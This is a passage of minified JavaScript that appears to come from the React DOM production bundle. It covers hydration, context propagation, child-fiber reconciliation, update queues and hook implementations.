l=Ot;e=Dt;var n=32-lt(l)-1;l&=~(1<<n),a+=1;var s=32-lt(t)+n;if(30<s){var i=n-n%5;s=(l&(1<<i)-1).toString(32),l>>=i,n-=i,Ot=1<<32-lt(t)+n|a<<n|l,Dt=s+e}else Ot=1<<s|a<<n|l,Dt=e}function Ti(e){e.return!==null&&(zt(e,1),hu(e,1,0))}function Ri(e){for(;e===Yn;)Yn=al[--ll],al[ll]=null,Gl=al[--ll],al[ll]=null;for(;e===ta;)ta=yt[--vt],yt[vt]=null,Dt=yt[--vt],yt[vt]=null,Ot=yt[--vt],yt[vt]=null}function gu(e,t){yt[vt++]=Ot,yt[vt++]=Dt,yt[vt++]=ta,Ot=t.id,Dt=t.overflow,ta=e}var we=null,pe=null,te=!1,aa=null,St=!1,Ai=Error(m(519));function la(e){var t=Error(m(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Ql(gt(t,e)),Ai}function yu(e){var t=e.stateNode,a=e.type,l=e.memoizedProps;switch(t[Le]=e,t[Xe]=l,a){case"dialog":J("cancel",t),J("close",t);break;case"iframe":case"object":case"embed":J("load",t);break;case"video":case"audio":for(a=0;a<dn.length;a++)J(dn[a],t);break;case"source":J("error",t);break;case"img":case"image":case"link":J("error",t),J("load",t);break;case"details":J("toggle",t);break;case"input":J("invalid",t),kc(t,l.value,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name,!0);break;case"select":J("invalid",t);break;case"textarea":J("invalid",t),qc(t,l.value,l.defaultValue,l.children)}a=l.children,typeof a!="string"&&typeof a!="number"&&typeof a!="bigint"||t.textContent===""+a||l.suppressHydrationWarning===!0||Ld(t.textContent,a)?(l.popover!=null&&(J("beforetoggle",t),J("toggle",t)),l.onScroll!=null&&J("scroll",t),l.onScrollEnd!=null&&J("scrollend",t),l.onClick!=null&&(t.onclick=Lt),t=!0):t=!1,t||la(e,!0)}function vu(e){for(we=e.return;we;)switch(we.tag){case 5:case 31:case 13:St=!1;return;case 27:case 3:St=!0;return;default:we=we.return}}function nl(e){if(e!==we)return!1;if(!te)return vu(e),te=!0,!1;var t=e.tag,a;if((a=t!==3&&t!==27)&&((a=t===5)&&(a=e.type,a=!(a!=="form"&&a!=="button")||Ko(e.type,e.memoizedProps)),a=!a),a&&pe&&la(e),vu(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(317));pe=Yd(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(317));pe=Yd(e)}else t===27?(t=pe,ya(e.type)?(e=$o,$o=null,pe=e):pe=t):pe=we?Et(e.stateNode.nextSibling):null;return!0}function Ma(){pe=we=null,te=!1}function xi(){var e=aa;return e!==null&&(Je===null?Je=e:Je.push.apply(Je,e),aa=null),e}function Ql(e){aa===null?aa=[e]:aa.push(e)}var Ci=r(null),qa=null,jt=null;function na(e,t,a){x(Ci,t._currentValue),t._currentValue=a}function Bt(e){e._currentValue=Ci.current,p(Ci)}function Oi(e,t,a){for(;e!==null;){var l=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,l!==null&&(l.childLanes|=t)):l!==null&&(l.childLanes&t)!==t&&(l.childLanes|=t),e===a)break;e=e.return}}function Di(e,t,a,l){var n=e.child;for(n!==null&&(n.return=e);n!==null;){var s=n.dependencies;if(s!==null){var i=n.child;s=s.firstContext;e:for(;s!==null;){var o=s;s=n;for(var c=0;c<t.length;c++)if(o.context===t[c]){s.lanes|=a,o=s.alternate,o!==null&&(o.lanes|=a),Oi(s.return,a,e),l||(i=null);break e}s=o.next}}else if(n.tag===18){if(i=n.return,i===null)throw Error(m(341));i.lanes|=a,s=i.alternate,s!==null&&(s.lanes|=a),Oi(i,a,e),i=null}else i=n.child;if(i!==null)i.return=n;else for(i=n;i!==null;){if(i===e){i=null;break}if(n=i.sibling,n!==null){n.return=i.return,i=n;break}i=i.return}n=i}}function sl(e,t,a,l){e=null;for(var n=t,s=!1;n!==null;){if(!s){if((n.flags&524288)!==0)s=!0;else if((n.flags&262144)!==0)break}if(n.tag===10){var i=n.alternate;if(i===null)throw Error(m(387));if(i=i.memoizedProps,i!==null){var o=n.type;nt(n.pendingProps.value,i.value)||(e!==null?e.push(o):e=[o])}}else if(n===P.current){if(i=n.alternate,i===null)throw Error(m(387));i.memoizedState.memoizedState!==n.memoizedState.memoizedState&&(e!==null?e.push(gn):e=[gn])}n=n.return}e!==null&&Di(t,e,a,l),t.flags|=262144}function Kn(e){for(e=e.firstContext;e!==null;){if(!nt(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function Na(e){qa=e,jt=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function Ue(e){return Su(qa,e)}function Vn(e,t){return qa===null&&Na(e),Su(e,t)}function Su(e,t){var a=t._currentValue;if(t={context:t,memoizedValue:a,next:null},jt===null){if(e===null)throw Error(m(308));jt=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else jt=jt.next=t;return a}var Lm=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(a,l){e.push(l)}};this.abort=function(){t.aborted=!0,e.forEach(function(a){return a()})}},wm=S.unstable_scheduleCallback,Um=S.unstable_NormalPriority,_e={$$typeof:ke,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function ki(){return{controller:new Lm,data:new Map,refCount:0}}function Yl(e){e.refCount--,e.refCount===0&&wm(Um,function(){e.controller.abort()})}var Kl=null,Mi=0,il=0,ol=null;function zm(e,t){if(Kl===null){var a=Kl=[];Mi=0,il=wo(),ol={status:"pending",value:void 0,then:function(l){a.push(l)}}}return Mi++,t.then(bu,bu),t}function bu(){if(--Mi===0&&Kl!==null){ol!==null&&(ol.status="fulfilled");var e=Kl;Kl=null,il=0,ol=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function jm(e,t){var a=[],l={status:"pending",value:null,reason:null,then:function(n){a.push(n)}};return e.then(function(){l.status="fulfilled",l.value=t;for(var n=0;n<a.length;n++)(0,a[n])(t)},function(n){for(l.status="rejected",l.reason=n,n=0;n<a.length;n++)(0,a[n])(void 0)}),l}var Eu=_.S;_.S=function(e,t){nd=tt(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&zm(e,t),Eu!==null&&Eu(e,t)};var La=r(null);function qi(){var e=La.current;return e!==null?e:de.pooledCache}function Xn(e,t){t===null?x(La,La.current):x(La,t.pool)}function _u(){var e=qi();return e===null?null:{parent:_e._currentValue,pool:e}}var cl=Error(m(460)),Ni=Error(m(474)),In=Error(m(542)),Zn={then:function(){}};function Tu(e){return e=e.status,e==="fulfilled"||e==="rejected"}function Ru(e,t,a){switch(a=e[a],a===void 0?e.push(t):a!==t&&(t.then(Lt,Lt),t=a),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,xu(e),e;default:if(typeof t.status=="string")t.then(Lt,Lt);else{if(e=de,e!==null&&100<e.shellSuspendCounter)throw Error(m(482));e=t,e.status="pending",e.then(function(l){if(t.status==="pending"){var n=t;n.status="fulfilled",n.value=l}},function(l){if(t.status==="pending"){var n=t;n.status="rejected",n.reason=l}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,xu(e),e}throw Ua=t,cl}}function wa(e){try{var t=e._init;return t(e._payload)}catch(a){throw a!==null&&typeof a=="object"&&typeof a.then=="function"?(Ua=a,cl):a}}var Ua=null;function Au(){if(Ua===null)throw Error(m(459));var e=Ua;return Ua=null,e}function xu(e){if(e===cl||e===In)throw Error(m(483))}var ul=null,Vl=0;function $n(e){var t=Vl;return Vl+=1,ul===null&&(ul=[]),Ru(ul,e,t)}function Xl(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function Wn(e,t){throw t.$$typeof===H?Error(m(525)):(e=Object.prototype.toString.call(t),Error(m(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function Cu(e){function t(f,d){if(e){var h=f.deletions;h===null?(f.deletions=[d],f.flags|=16):h.push(d)}}function a(f,d){if(!e)return null;for(;d!==null;)t(f,d),d=d.sibling;return null}function l(f){for(var d=new Map;f!==null;)f.key!==null?d.set(f.key,f):d.set(f.index,f),f=f.sibling;return d}function n(f,d){return f=Ut(f,d),f.index=0,f.sibling=null,f}function s(f,d,h){return f.index=h,e?(h=f.alternate,h!==null?(h=h.index,h<d?(f.flags|=67108866,d):h):(f.flags|=67108866,d)):(f.flags|=1048576,d)}function i(f){return e&&f.alternate===null&&(f.flags|=67108866),f}function o(f,d,h,T){return d===null||d.tag!==6?(d=Ei(h,f.mode,T),d.return=f,d):(d=n(d,h),d.return=f,d)}function c(f,d,h,T){var j=h.type;return j===xe?E(f,d,h.props.children,T,h.key):d!==null&&(d.elementType===j||typeof j=="object"&&j!==null&&j.$$typeof===Ge&&wa(j)===d.type)?(d=n(d,h.props),Xl(d,h),d.return=f,d):(d=Qn(h.type,h.key,h.props,null,f.mode,T),Xl(d,h),d.return=f,d)}function g(f,d,h,T){return d===null||d.tag!==4||d.stateNode.containerInfo!==h.containerInfo||d.stateNode.implementation!==h.implementation?(d=_i(h,f.mode,T),d.return=f,d):(d=n(d,h.children||[]),d.return=f,d)}function E(f,d,h,T,j){return d===null||d.tag!==7?(d=ka(h,f.mode,T,j),d.return=f,d):(d=n(d,h),d.return=f,d)}function R(f,d,h){if(typeof d=="string"&&d!==""||typeof d=="number"||typeof d=="bigint")return d=Ei(""+d,f.mode,h),d.return=f,d;if(typeof d=="object"&&d!==null){switch(d.$$typeof){case ne:return h=Qn(d.type,d.key,d.props,null,f.mode,h),Xl(h,d),h.return=f,h;case me:return d=_i(d,f.mode,h),d.return=f,d;case Ge:return d=wa(d),R(f,d,h)}if(et(d)||Ce(d))return d=ka(d,f.mode,h,null),d.return=f,d;if(typeof d.then=="function")return R(f,$n(d),h);if(d.$$typeof===ke)return R(f,Vn(f,d),h);Wn(f,d)}return null}function y(f,d,h,T){var j=d!==null?d.key:null;if(typeof h=="string"&&h!==""||typeof h=="number"||typeof h=="bigint")return j!==null?null:o(f,d,""+h,T);if(typeof h=="object"&&h!==null){switch(h.$$typeof){case ne:return h.key===j?c(f,d,h,T):null;case me:return h.key===j?g(f,d,h,T):null;case Ge:return h=wa(h),y(f,d,h,T)}if(et(h)||Ce(h))return j!==null?null:E(f,d,h,T,null);if(typeof h.then=="function")return y(f,d,$n(h),T);if(h.$$typeof===ke)return y(f,d,Vn(f,h),T);Wn(f,h)}return null}function v(f,d,h,T,j){if(typeof T=="string"&&T!==""||typeof T=="number"||typeof T=="bigint")return f=f.get(h)||null,o(d,f,""+T,j);if(typeof T=="object"&&T!==null){switch(T.$$typeof){case ne:return f=f.get(T.key===null?h:T.key)||null,c(d,f,T,j);case me:return f=f.get(T.key===null?h:T.key)||null,g(d,f,T,j);case Ge:return T=wa(T),v(f,d,h,T,j)}if(et(T)||Ce(T))return f=f.get(h)||null,E(d,f,T,j,null);if(typeof T.then=="function")return v(f,d,h,$n(T),j);if(T.$$typeof===ke)return v(f,d,h,Vn(d,T),j);Wn(d,T)}return null}function N(f,d,h,T){for(var j=null,ae=null,w=d,I=d=0,ee=null;w!==null&&I<h.length;I++){w.index>I?(ee=w,w=null):ee=w.sibling;var le=y(f,w,h[I],T);if(le===null){w===null&&(w=ee);break}e&&w&&le.alternate===null&&t(f,w),d=s(le,d,I),ae===null?j=le:ae.sibling=le,ae=le,w=ee}if(I===h.length)return a(f,w),te&&zt(f,I),j;if(w===null){for(;I<h.length;I++)w=R(f,h[I],T),w!==null&&(d=s(w,d,I),ae===null?j=w:ae.sibling=w,ae=w);return te&&zt(f,I),j}for(w=l(w);I<h.length;I++)ee=v(w,f,I,h[I],T),ee!==null&&(e&&ee.alternate!==null&&w.delete(ee.key===null?I:ee.key),d=s(ee,d,I),ae===null?j=ee:ae.sibling=ee,ae=ee);return e&&w.forEach(function(_a){return t(f,_a)}),te&&zt(f,I),j}function G(f,d,h,T){if(h==null)throw Error(m(151));for(var j=null,ae=null,w=d,I=d=0,ee=null,le=h.next();w!==null&&!le.done;I++,le=h.next()){w.index>I?(ee=w,w=null):ee=w.sibling;var _a=y(f,w,le.value,T);if(_a===null){w===null&&(w=ee);break}e&&w&&_a.alternate===null&&t(f,w),d=s(_a,d,I),ae===null?j=_a:ae.sibling=_a,ae=_a,w=ee}if(le.done)return a(f,w),te&&zt(f,I),j;if(w===null){for(;!le.done;I++,le=h.next())le=R(f,le.value,T),le!==null&&(d=s(le,d,I),ae===null?j=le:ae.sibling=le,ae=le);return te&&zt(f,I),j}for(w=l(w);!le.done;I++,le=h.next())le=v(w,f,I,le.value,T),le!==null&&(e&&le.alternate!==null&&w.delete(le.key===null?I:le.key),d=s(le,d,I),ae===null?j=le:ae.sibling=le,ae=le);return e&&w.forEach(function($p){return t(f,$p)}),te&&zt(f,I),j}function re(f,d,h,T){if(typeof h=="object"&&h!==null&&h.type===xe&&h.key===null&&(h=h.props.children),typeof h=="object"&&h!==null){switch(h.$$typeof){case ne:e:{for(var j=h.key;d!==null;){if(d.key===j){if(j=h.type,j===xe){if(d.tag===7){a(f,d.sibling),T=n(d,h.props.children),T.return=f,f=T;break e}}else if(d.elementType===j||typeof j=="object"&&j!==null&&j.$$typeof===Ge&&wa(j)===d.type){a(f,d.sibling),T=n(d,h.props),Xl(T,h),T.return=f,f=T;break e}a(f,d);break}else t(f,d);d=d.sibling}h.type===xe?(T=ka(h.props.children,f.mode,T,h.key),T.return=f,f=T):(T=Qn(h.type,h.key,h.props,null,f.mode,T),Xl(T,h),T.return=f,f=T)}return i(f);case me:e:{for(j=h.key;d!==null;){if(d.key===j)if(d.tag===4&&d.stateNode.containerInfo===h.containerInfo&&d.stateNode.implementation===h.implementation){a(f,d.sibling),T=n(d,h.children||[]),T.return=f,f=T;break e}else{a(f,d);break}else t(f,d);d=d.sibling}T=_i(h,f.mode,T),T.return=f,f=T}return i(f);case Ge:return h=wa(h),re(f,d,h,T)}if(et(h))return N(f,d,h,T);if(Ce(h)){if(j=Ce(h),typeof j!="function")throw Error(m(150));return h=j.call(h),G(f,d,h,T)}if(typeof h.then=="function")return re(f,d,$n(h),T);if(h.$$typeof===ke)return re(f,d,Vn(f,h),T);Wn(f,h)}return typeof h=="string"&&h!==""||typeof h=="number"||typeof h=="bigint"?(h=""+h,d!==null&&d.tag===6?(a(f,d.sibling),T=n(d,h),T.return=f,f=T):(a(f,d),T=Ei(h,f.mode,T),T.return=f,f=T),i(f)):a(f,d)}return function(f,d,h,T){try{Vl=0;var j=re(f,d,h,T);return ul=null,j}catch(w){if(w===cl||w===In)throw w;var ae=st(29,w,null,f.mode);return ae.lanes=T,ae.return=f,ae}finally{}}}var za=Cu(!0),Ou=Cu(!1),sa=!1;function Li(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function wi(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function ia(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function oa(e,t,a){var l=e.updateQueue;if(l===null)return null;if(l=l.shared,(se&2)!==0){var n=l.pending;return n===null?t.next=t:(t.next=n.next,n.next=t),l.pending=t,t=Gn(e),du(e,null,a),t}return Hn(e,l,t,a),Gn(e)}function Il(e,t,a){if(t=t.updateQueue,t!==null&&(t=t.shared,(a&4194048)!==0)){var l=t.lanes;l&=e.pendingLanes,a|=l,t.lanes=a,Sc(e,a)}}function Ui(e,t){var a=e.updateQueue,l=e.alternate;if(l!==null&&(l=l.updateQueue,a===l)){var n=null,s=null;if(a=a.firstBaseUpdate,a!==null){do{var i={lane:a.lane,tag:a.tag,payload:a.payload,callback:null,next:null};s===null?n=s=i:s=s.next=i,a=a.next}while(a!==null);s===null?n=s=t:s=s.next=t}else n=s=t;a={baseState:l.baseState,firstBaseUpdate:n,lastBaseUpdate:s,shared:l.shared,callbacks:l.callbacks},e.updateQueue=a;return}e=a.lastBaseUpdate,e===null?a.firstBaseUpdate=t:e.next=t,a.lastBaseUpdate=t}var zi=!1;function Zl(){if(zi){var e=ol;if(e!==null)throw e}}function $l(e,t,a,l){zi=!1;var n=e.updateQueue;sa=!1;var s=n.firstBaseUpdate,i=n.lastBaseUpdate,o=n.shared.pending;if(o!==null){n.shared.pending=null;var c=o,g=c.next;c.next=null,i===null?s=g:i.next=g,i=c;var E=e.alternate;E!==null&&(E=E.updateQueue,o=E.lastBaseUpdate,o!==i&&(o===null?E.firstBaseUpdate=g:o.next=g,E.lastBaseUpdate=c))}if(s!==null){var R=n.baseState;i=0,E=g=c=null,o=s;do{var y=o.lane&-536870913,v=y!==o.lane;if(v?(F&y)===y:(l&y)===y){y!==0&&y===il&&(zi=!0),E!==null&&(E=E.next={lane:0,tag:o.tag,payload:o.payload,callback:null,next:null});e:{var N=e,G=o;y=t;var re=a;switch(G.tag){case 1:if(N=G.payload,typeof N=="function"){R=N.call(re,R,y);break e}R=N;break e;case 3:N.flags=N.flags&-65537|128;case 0:if(N=G.payload,y=typeof N=="function"?N.call(re,R,y):N,y==null)break e;R=D({},R,y);break e;case 2:sa=!0}}y=o.callback,y!==null&&(e.flags|=64,v&&(e.flags|=8192),v=n.callbacks,v===null?n.callbacks=[y]:v.push(y))}else v={lane:y,tag:o.tag,payload:o.payload,callback:o.callback,next:null},E===null?(g=E=v,c=R):E=E.next=v,i|=y;if(o=o.next,o===null){if(o=n.shared.pending,o===null)break;v=o,o=v.next,v.next=null,n.lastBaseUpdate=v,n.shared.pending=null}}while(!0);E===null&&(c=R),n.baseState=c,n.firstBaseUpdate=g,n.lastBaseUpdate=E,s===null&&(n.shared.lanes=0),fa|=i,e.lanes=i,e.memoizedState=R}}function Du(e,t){if(typeof e!="function")throw Error(m(191,e));e.call(t)}function ku(e,t){var a=e.callbacks;if(a!==null)for(e.callbacks=null,e=0;e<a.length;e++)Du(a[e],t)}var rl=r(null),Jn=r(0);function Mu(e,t){e=Zt,x(Jn,e),x(rl,t),Zt=e|t.baseLanes}function ji(){x(Jn,Zt),x(rl,rl.current)}function Bi(){Zt=Jn.current,p(rl),p(Jn)}var it=r(null),bt=null;function ca(e){var t=e.alternate;x(be,be.current&1),x(it,e),bt===null&&(t===null||rl.current!==null||t.memoizedState!==null)&&(bt=e)}function Hi(e){x(be,be.current),x(it,e),bt===null&&(bt=e)}function qu(e){e.tag===22?(x(be,be.current),x(it,e),bt===null&&(bt=e)):ua()}function ua(){x(be,be.current),x(it,it.current)}function ot(e){p(it),bt===e&&(bt=null),p(be)}var be=r(0);function Pn(e){for(var t=e;t!==null;){if(t.tag===13){var a=t.memoizedState;if(a!==null&&(a=a.dehydrated,a===null||Io(a)||Zo(a)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder==="forwards"||t.memoizedProps.revealOrder==="backwards"||t.memoizedProps.revealOrder==="unstable_legacy-backwards"||t.memoizedProps.revealOrder==="together")){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Ht=0,X=null,ce=null,Te=null,Fn=!1,dl=!1,ja=!1,es=0,Wl=0,fl=null,Bm=0;function ve(){throw Error(m(321))}function Gi(e,t){if(t===null)return!1;for(var a=0;a<t.length&&a<e.length;a++)if(!nt(e[a],t[a]))return!1;return!0}function Qi(e,t,a,l,n,s){return Ht=s,X=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,_.H=e===null||e.memoizedState===null?hr:lo,ja=!1,s=a(l,n),ja=!1,dl&&(s=Lu(t,a,l,n)),Nu(e),s}function Nu(e){_.H=Fl;var t=ce!==null&&ce.next!==null;if(Ht=0,Te=ce=X=null,Fn=!1,Wl=0,fl=null,t)throw Error(m(300));e===null||Re||(e=e.dependencies,e!==null&&Kn(e)&&(Re=!0))}function Lu(e,t,a,l){X=e;var n=0;do{if(dl&&(fl=null),Wl=0,dl=!1,25<=n)throw Error(m(301));if(n+=1,Te=ce=null,e.updateQueue!=null){var s=e.updateQueue;s.lastEffect=null,s.events=null,s.stores=null,s.memoCache!=null&&(s.memoCache.index=0)}_.H=gr,s=t(a,l)}while(dl);return s}function Hm(){var e=_.H,t=e.useState()[0];return t=typeof t.then=="function"?Jl(t):t,e=e.useState()[0],(ce!==null?ce.memoizedState:null)!==e&&(X.flags|=1024),t}function Yi(){var e=es!==0;return es=0,e}function Ki(e,t,a){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a}function Vi(e){if(Fn){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}Fn=!1}Ht=0,Te=ce=X=null,dl=!1,Wl=es=0,fl=null}function Ke(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Te===null?X.memoizedState=Te=e:Te=Te.next=e,Te}function Ee(){if(ce===null){var e=X.alternate;e=e!==null?e.memoizedState:null}else e=ce.next;var t=Te===null?X.memoizedState:Te.next;if(t!==null)Te=t,ce=e;else{if(e===null)throw X.alternate===null?Error(m(467)):Error(m(310));ce=e,e={memoizedState:ce.memoizedState,baseState:ce.baseState,baseQueue:ce.baseQueue,queue:ce.queue,next:null},Te===null?X.memoizedState=Te=e:Te=Te.next=e}return Te}function ts(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Jl(e){var t=Wl;return Wl+=1,fl===null&&(fl=[]),e=Ru(fl,e,t),t=X,(Te===null?t.memoizedState:Te.next)===null&&(t=t.alternate,_.H=t===null||t.memoizedState===null?hr:lo),e}function as(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return Jl(e);if(e.$$typeof===ke)return Ue(e)}throw Error(m(438,String(e)))}function Xi(e){var t=null,a=X.updateQueue;if(a!==null&&(t=a.memoCache),t==null){var l=X.alternate;l!==null&&(l=l.updateQueue,l!==null&&(l=l.memoCache,l!=null&&(t={data:l.data.map(function(n){return n.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),a===null&&(a=ts(),X.updateQueue=a),a.memoCache=t,a=t.data[t.index],a===void 0)for(a=t.data[t.index]=Array(e),l=0;l<e;l++)a[l]=Jt;return t.index++,a}function Gt(e,t){return typeof t=="function"?t(e):t}function ls(e){var t=Ee();return Ii(t,ce,e)}function Ii(e,t,a){var l=e.queue;if(l===null)throw Error(m(311));l.lastRenderedReducer=a;var n=e.baseQueue,s=l.pending;if(s!==null){if(n!==null){var i=n.next;n.next=s.next,s.next=i}t.baseQueue=n=s,l.pending=null}if(s=e.baseState,n===null)e.memoizedState=s;else{t=n.next;var o=i=null,c=null,g=t,E=!1;do{var R=g.lane&-536870913;if(R!==g.lane?(F&R)===R:(Ht&R)===R){var y=g.revertLane;if(y===0)c!==null&&(c=c.next={lane:0,revertLane:0,gesture:null,action:g.action,hasEagerState:g.hasEagerState,eagerState:g.eagerState,next:null}),R===il&&(E=!0);else if((Ht&y)===y){g=g.next,y===il&&(E=!0);continue}else R={lane:0,revertLane:g.revertLane,gesture:null,action:g.action,hasEagerState:g.hasEagerState,eagerState:g.eagerState,next:null},c===null?(o=c=R,i=s):c=c.next=R,X.lanes|=y,fa|=y;R=g.action,ja&&a(s,R),s=g.hasEagerState?g.eagerState:a(s,R)}else y={lane:R,revertLane:g.revertLane,gesture:g.gesture,action:g.action,hasEagerState:g.hasEagerState,eagerState:g.eagerState,next:null},c===null?(o=c=y,i=s):c=c.next=y,X.lanes|=R,fa|=R;g=g.next}while(g!==null&&g!==t);if(c===null?i=s:c.next=o,!nt(s,e.memoizedState)&&(Re=!0,E&&(a=ol,a!==null)))throw a;e.memoizedState=s,e.baseState=i,e.baseQueue=c,l.lastRenderedState=s}return n===null&&(l.lanes=0),[e.memoizedState,l.dispatch]}function Zi(e){var t=Ee(),a=t.queue;if(a===null)throw Error(m(311));a.lastRenderedReducer=e;var l=a.dispatch,n=a.pending,s=t.memoizedState;if(n!==null){a.pending=null;var i=n=n.next;do s=e(s,i.action),i=i.next;while(i!==n);nt(s,t.memoizedState)||(Re=!0),t.memoizedState=s,t.baseQueue===null&&(t.baseState=s),a.lastRenderedState=s}return[s,l]}function wu(e,t,a){var l=X,n=Ee(),s=te;if(s){if(a===void 0)throw Error(m(407));a=a()}else a=t();var i=!nt((ce||n).memoizedState,a);if(i&&(n.memoizedState=a,Re=!0),n=n.queue,Ji(ju.bind(null,l,n,e),[e]),n.getSnapshot!==t||i||Te!==null&&Te.memoizedState.tag&1){if(l.flags|=2048,ml(9,{destroy:void 0},zu.bind(null,l,n,a,t),null),de===null)throw Error(m(349));s||(Ht&127)!==0||Uu(l,t,a)}return a}function Uu(e,t,a){e.flags|=16384,e={getSnapshot:t,value:a},t=X.updateQueue,t===null?(t=ts(),X.updateQueue=t,t.stores=[e]):(a=t.stores,a===null?t.stores=[e]:a.push(e))}function zu(e,t,a,l){t.value=a,t.getSnapshot=l,Bu(t)&&Hu(e)}function ju(e,t,a){return a(function(){Bu(t)&&Hu(e)})}function Bu(e){var t=e.getSnapshot;e=e.value;try{var a=t();return!nt(e,a)}catch{return!0}}function Hu(e){var t=Da(e,2);t!==null&&Pe(t,e,2)}function $i(e){var t=Ke();if(typeof e=="function"){var a=e;if(e=a(),ja){Pt(!0);try{a()}finally{Pt(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Gt,lastRenderedState:e},t}function Gu(e,t,a,l){return e.baseState=a,Ii(e,ce,typeof l=="function"?l:Gt)}function Gm(e,t,a,l,n){if(is(e))throw Error(m(485));if(e=t.action,e!==null){var s={payload:n,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(i){s.listeners.push(i)}};_.T!==null?a(!0):s.isTransition=!1,l(s),a=t.pending,a===null?(s.next=t.pending=s,Qu(t,s)):(s.next=a.next,t.pending=a.next=s)}}function Qu(e,t){var a=t.action,l=t.payload,n=e.state;if(t.isTransition){var s=_.T,i={};_.T=i;try{var o=a(n,l),c=_.S;c!==null&&c(i,o),Yu(e,t,o)}catch(g){Wi(e,t,g)}finally{s!==null&&i.types!==null&&(s.types=i.types),_.T=s}}else try{s=a(n,l),Yu(e,t,s)}catch(g){Wi(e,t,g)}}function Yu(e,t,a){a!==null&&typeof a=="object"&&typeof a.then=="function"?a.then(function(l){Ku(e,t,l)},function(l){return Wi(e,t,l)}):Ku(e,t,a)}function Ku(e,t,a){t.status="fulfilled",t.value=a,Vu(t),e.state=a,t=e.pending,t!==null&&(a=t.next,a===t?e.pending=null:(a=a.next,t.next=a,Qu(e,a)))}function Wi(e,t,a){var l=e.pending;if(e.pending=null,l!==null){l=l.next;do t.status="rejected",t.reason=a,Vu(t),t=t.next;while(t!==l)}e.action=null}function Vu(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function Xu(e,t){return t}function Iu(e,t){if(te){var a=de.formState;if(a!==null){e:{var l=X;if(te){if(pe){t:{for(var n=pe,s=St;n.nodeType!==8;){if(!s){n=null;break t}if(n=Et(n.nextSibling),n===null){n=null;break t}}s=n.data,n=s==="F!"||s==="F"?n:null}if(n){pe=Et(n.nextSibling),l=n.data==="F!";break e}}la(l)}l=!1}l&&(t=a[0])}}return a=Ke(),a.memoizedState=a.baseState=t,l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Xu,lastRenderedState:t},a.queue=l,a=fr.bind(null,X,l),l.dispatch=a,l=$i(!1),s=ao.bind(null,X,!1,l.queue),l=Ke(),n={state:t,dispatch:null,action:e,pending:null},l.queue=n,a=Gm.bind(null,X,n,s,a),n.dispatch=a,l.memoizedState=e,[t,a,!1]}function Zu(e){var t=Ee();return $u(t,ce,e)}function $u(e,t,a){if(t=Ii(e,t,Xu)[0],e=ls(Gt)[0],typeof t=="object"&&t!==null&&typeof t.then=="function")try{var l=Jl(t)}catch(i){throw i===cl?In:i}else l=t;t=Ee();var n=t.queue,s=n.dispatch;return a!==t.memoizedState&&(X.flags|=2048,ml(9,{destroy:void 0},Qm.bind(null,n,a),null)),[l,s,e]}function Qm(e,t){e.action=t}function Wu(e){var t=Ee(),a=ce;if(a!==null)return $u(t,a,e);Ee(),t=t.memoizedState,a=Ee();var l=a.queue.dispatch;return a.memoizedState=e,[t,l,!1]}function ml(e,t,a,l){return e={tag:e,create:a,deps:l,inst:t,next:null},t=X.updateQueue,t===null&&(t=ts(),X.updateQueue=t),a=t.lastEffect,a===null?t.lastEffect=e.next=e:(l=a.next,a.next=e,e.next=l,t.lastEffect=e),e}function Ju(){return Ee().memoizedState}function ns(e,t,a,l){var n=Ke();X.flags|=e,n.memoizedState=ml(1|t,{destroy:void 0},a,l===void 0?null:l)}function ss(e,t,a,l){var n=Ee();l=l===void 0?null:l;var s=n.memoizedState.inst;ce!==null&&l!==null&&Gi(l,ce.memoizedState.deps)?n.memoizedState=ml(t,s,a,l):(X.flags|=e,n.memoizedState=ml(1|t,s,a,l))}function Pu(e,t){ns(8390656,8,e,t)}function Ji(e,t){ss(2048,8,e,t)}function Ym(e){X.flags|=4;var t=X.updateQueue;if(t===null)t=ts(),X.updateQueue=t,t.events=[e];else{var a=t.events;a===null?t.events=[e]:a.push(e)}}function Fu(e){var t=Ee().memoizedState;return Ym({ref:t,nextImpl:e}),function(){if((se&2)!==0)throw Error(m(440));return t.impl.apply(void 0,arguments)}}function er(e,t){return ss(4,2,e,t)}function tr(e,t){return ss(4,4,e,t)}function ar(e,t){if(typeof t=="function"){e=e();var a=t(e);return function(){typeof 